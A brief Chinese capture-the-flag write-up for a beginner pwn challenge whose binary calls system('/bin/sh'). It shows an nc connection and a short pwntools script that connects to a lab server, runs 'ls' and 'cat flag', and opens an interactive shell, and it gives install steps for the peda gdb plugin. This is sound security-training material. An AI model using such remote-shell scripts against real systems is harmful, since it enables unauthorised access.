1、按F5键时，发现主函数中直接调用了system("/bin/sh")语句，说明连接即可返回shell
2、两种解题方法：
（1）直接使用nc连接：nc -nv ip port
（2）编写python脚本：
#coding = utf-8
from pwn import *

context.log_level = 'debug'
p = remote('111.198.29.45', 54766)
p.sendline('ls')
p.sendline('cat flag')
#进行交互
p.interactive()

ps：
pwntools是CTF框架和开发库，旨在快速构建原型和开发，只支持python2。
peda是gdb的插件，安装方法：
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"